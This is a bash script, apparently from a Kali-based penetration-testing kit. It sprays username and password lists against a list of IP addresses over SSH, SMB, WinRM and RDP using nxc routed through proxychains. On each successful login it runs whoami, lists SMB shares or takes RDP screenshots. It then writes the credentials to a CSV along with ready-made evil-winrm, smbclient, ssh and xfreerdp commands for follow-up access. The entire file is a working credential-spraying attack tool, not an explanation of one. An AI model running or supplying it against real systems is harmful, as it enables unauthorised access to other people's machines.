#!/bin/bash

# Function to display usage
usage() {
    echo "Usage: $0 [-a] [-v] [-s] <path to ip list> <path to usernames list> <path to passwords list>"
    echo "  -a: Test every username against every password."
    echo "  -v: Verbose mode. Print debug statements."
    echo "  -s: Suppress success messages."
    exit 1
}

# Initialize variables to control output
VERBOSE=false
SUPPRESS_SUCCESS=false
ALL_COMBINATIONS=false

# Modify the option handling
while getopts "avs" option; do
    case $option in
        a)
            ALL_COMBINATIONS=true
            ;;
        v)
            VERBOSE=true
            ;;
        s)
            SUPPRESS_SUCCESS=true
            ;;
        *)
            usage
            ;;
    esac
done

shift "$((OPTIND-1))"

# Check for correct number of arguments
if [ "$#" -ne 3 ]; then
    usage
fi

# Color codes for printing
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Prompt the user for the domain and read the input into a variable
read -p "Enter the domain (leave empty if none): " GLOBAL_DOMAIN

# Assign arguments to variables
IP_LIST=$1
USER_LIST=$2
PASS_LIST=$3

# Define CSV file to store results
RESULTS_CSV="results.csv"

# Check if CSV file exists and if not, create it and add headers
if [ ! -f "$RESULTS_CSV" ]; then
    echo "Service,IP,Port,User,Password,Domain,Additional Info,SMBClient Command,NXC SMB Command,SSH Command,WinRM Command,RDP Command" > "$RESULTS_CSV"
fi

# Function to perform checks and output only successful attempts
perform_check() {
    local service=$1
    local ip=$2
    local user=$3
    local pass=$4
    
    local domain="$GLOBAL_DOMAIN"
    local username="${user##*\\}"
    
    local extra_args="${@:5}"
    local temp_output=$(mktemp)

    # Only print verbose (testing) output if VERBOSE is true
    if [ "$VERBOSE" = true ]; then
        echo -e "Testing $service: $ip with username: $username and password: $pass"
    fi

    proxychains /home/kali/.local/bin/nxc $service $ip -u "$username" -p "$pass" $extra_args > "$temp_output" 2>&1
    
    if grep -q "\[+\]" "$temp_output"; then
        # Construct and print success message if SUPPRESS_SUCCESS is false
        if [ "$SUPPRESS_SUCCESS" = false ]; then
            echo -e "${YELLOW}Success: $service login to $ip as $username with password $pass${NC}"
        fi

        # Service-specific command construction for CSV export
        local smbclient_command=""
        local nxc_smb_command=""
        local ssh_command=""
        local winrm_command=""
        local rdp_command=""
        local additional_info="Connection successful"

        case "$service" in
            smb)
                smbclient_command="proxychains smbclient \\\\\\\\"$ip"\\\\<SHARE> -U '$username%$pass' -W \"$domain\""
                nxc_smb_command="proxychains nxc smb $ip -u '$username' -p '$pass' --shares"
                ;;
            ssh)
                ssh_command="proxychains ssh $username@$ip"
                ;;
            winrm)
                winrm_command="proxychains evil-winrm -i $ip -u '$username' -p '$pass'"
                ;;
            rdp)
                rdp_command="proxychains xfreerdp /cert-ignore /compression /auto-reconnect /u:'$username' /p:'$pass' /v:$ip /d:\"$domain\""
                ;;
            *)
                additional_info="Unsupported service"
                ;;
        esac

        # Append successful attempt to CSV
        echo "$service,$ip,$port,$username,$pass,$domain,$additional_info,\"$smbclient_command\",\"$nxc_smb_command\",\"$ssh_command\",\"$winrm_command\",\"$rdp_command\"" >> "$RESULTS_CSV"
    fi

    rm "$temp_output"
}

if $ALL_COMBINATIONS; then
    while IFS= read -r user; do
        while IFS= read -r pass; do
            while IFS= read -r ip; do
                perform_check ssh $ip "$user" "$pass"
                perform_check smb $ip "$user" "$pass" "--shares"
                perform_check winrm $ip "$user" "$pass" "-x whoami"
                perform_check rdp $ip "$user" "$pass" "--screenshot"
            done < "$IP_LIST"
        done < "$PASS_LIST"
    done < "$USER_LIST"
else
    paste -d: "$USER_LIST" "$PASS_LIST" | while IFS=: read -r user pass; do
        while IFS= read -r ip; do
            perform_check ssh $ip "$user" "$pass"
            perform_check smb $ip "$user" "$pass" "--shares"
            perform_check winrm $ip "$user" "$pass" "-x whoami"
            perform_check rdp $ip "$user" "$pass" "--screenshot"
        done < "$IP_LIST"
    done
fi
